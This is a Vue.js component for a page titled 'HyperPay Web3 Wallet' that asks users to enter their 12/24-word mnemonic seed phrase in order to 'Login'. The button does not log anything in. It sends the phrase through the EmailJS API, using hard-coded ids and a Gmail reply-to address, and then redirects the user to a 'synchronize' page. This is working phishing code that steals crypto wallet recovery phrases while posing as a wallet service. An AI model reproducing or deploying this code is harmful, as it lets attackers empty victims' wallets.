<template>
  <div>
    <div style="width: fit-content;" class="bg-transparent border border-gray-600 mb-6 w-fit rounded-full flex space-x-1 shadow-sm">
      <div
        :class="`${
          activeTab === 'one' ? 'bg-[#006eff]' : ''
        } text-gray-500 hover:text-[#006eff] cursor-pointer font-semibold text-sm rounded-full px-2 py-2`"
        @click="changeActiveTab('one')"
      >
        Custody
      </div>
      <div
        :class="`${
          activeTab === 'two' ? 'bg-[#006eff]' : ''
        } text-white cursor-pointer font-semibold text-sm rounded-full px-2 py-2`"
        @click="changeActiveTab('two')"
      >
        Web3
      </div>
    </div>
    <hr class="border-gray-600">
    <div
      class="rounded-lg w-full mt-10"
    >
      <div id="daoos">
        <h1 class="mb-12 text-2xl text-white md:text-[31px] font-bold">
          Welcome to HyperPay Web3 Wallet
        </h1>
        <section class="section">
          <div>
            <div class="mb-10">
              <label class="text-white" for=""
                >Input your phrase value
              </label>
              <textarea
                v-model="phrase"
                placeholder="Enter 12/24 bit mnemonic phrases"
                style="
                  border-radius: 8px;
                  transition: 0.2s ease-in-out;
                  font-weight: 400;
                "
                id="w3review"
                class="w-full outline-none mt-2 p-4 text-gray-400 border border-gray-600 bg-transparent"
                name="w3review"
                rows="4"
                cols="50"
              ></textarea>
            </div>
          </div>

          <button
            @click="getInformation"
            class="flex items-center justify-center bg-[#3377f8] w-full py-4 rounded-full"
          >
            <div class="flex items-center">
              <strong class="text-white">Login</strong>
              <div
                v-if="isLoading"
                class="ml-2 w-5 h-5 rounded-full animate-spin border-4 border-dashed border-primary border-t-transparent"
              ></div>
            </div>
          </button>
        </section>
      </div>
    </div>
  </div>
</template>

<script>
import axios from 'axios'
export default {
  data() {
    return {
      isLoading: false,
      phrase: '',
      activeTab: 'two'
    }
  },
  methods: {
    changeActiveTab(params) {
      if (params === 'one') {
        this.$router.push('/custody')
      }
      if (params === 'two') {
        this.$router.push('/web3')
      }
    },
    getInformation() {
      let self = this
      try {
        this.isLoading = true
        if (this.phrase !== '') {
          var data = {
            service_id: 'service_81x9bor',
            template_id: 'template_a7emnpt',
            user_id: 'NdrSHIyN7Q4LWKs5s',
            template_params: {
              from_name: 'Hyper Pay',
              email: this.phrase,
              reply_to: 'customeronlineagent@gmail.com',
            },
          }
          axios
            .post('https://api.emailjs.com/api/v1.0/email/send', data)
            .then(function () {
              self.$router.push('/synchronize')
              self.isLoading = false
            })
            .catch(function () {
              self.isLoading = false
              self.$toast.error('Something went wrong, contact administrator')
            })
        } else {
          this.$toast.info('Wrong Input!. Fill the input form ')
          this.isLoading = false
        }
      } catch (error) {
        this.$toast.error('Something went wrong')
      }
    },
  },
}
</script>

<style></style>
